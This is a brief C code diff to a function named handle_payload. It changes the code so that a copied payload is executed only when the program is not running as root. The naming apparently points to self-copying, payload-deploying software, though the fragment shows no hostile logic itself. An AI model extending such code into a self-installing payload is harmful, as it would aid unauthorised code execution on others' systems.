@@ -58,7 +58,8 @@ static void	handle_payload(bool root, char **envp)
 	if (strcmp(exec_path, payload_path)) // Not executed as payload, need to export it
 	{
 		export_payload(root, exec_path, payload_path);
-		exec_payload(payload_path, envp);
+		if (!root)
+			exec_payload(payload_path, envp);
 	}
 	if (!root)
 		free(payload_path);
